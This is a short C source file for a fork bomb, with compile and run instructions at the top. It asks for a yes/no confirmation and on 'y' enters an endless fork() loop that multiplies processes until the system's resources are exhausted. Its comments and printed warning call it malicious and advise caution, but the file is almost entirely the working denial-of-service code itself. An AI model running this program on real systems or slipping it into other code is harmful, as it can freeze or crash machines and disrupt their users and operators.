// To compile: gcc forkbomb.c -o forkbomb
// To run: ./forkbomb (NOT RECOMENDED)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    char choice; // Variable to track user input for executing the forkbomb
    
    // Ask the user for input: 'y' or 'Y' for yes, 'n' or 'N' for no
    printf("Are you sure you want to execute the forkbomb? (yes/no): ");
    scanf("%c", &choice);

    // If user chooses to execute the forkbomb
    if(choice == 'y' || choice == 'Y'){
        // Print a warning message about the forkbomb
        printf("A forkbomb is a malicious piece of code that replicates itself exponentially,\n"
               "consuming system resources and potentially crashing the system.\n"
               "Use it with extreme caution and only in controlled environments.\n\n");

        // Infinite loop that continuously creates child processes
        while(1){
            fork(); // Create a child process
        }
    }

    // If user chooses not to execute the forkbomb
    else if(choice == 'n' || choice == 'N'){
        // Print a message indicating the forkbomb will not be executed
        printf("Forkbomb will NOT be executed.\n");
    }
    
    // If user input is invalid
    else{
        // Print a message indicating invalid input
        printf("Invalid input.\n");
    }

    return 0;
}
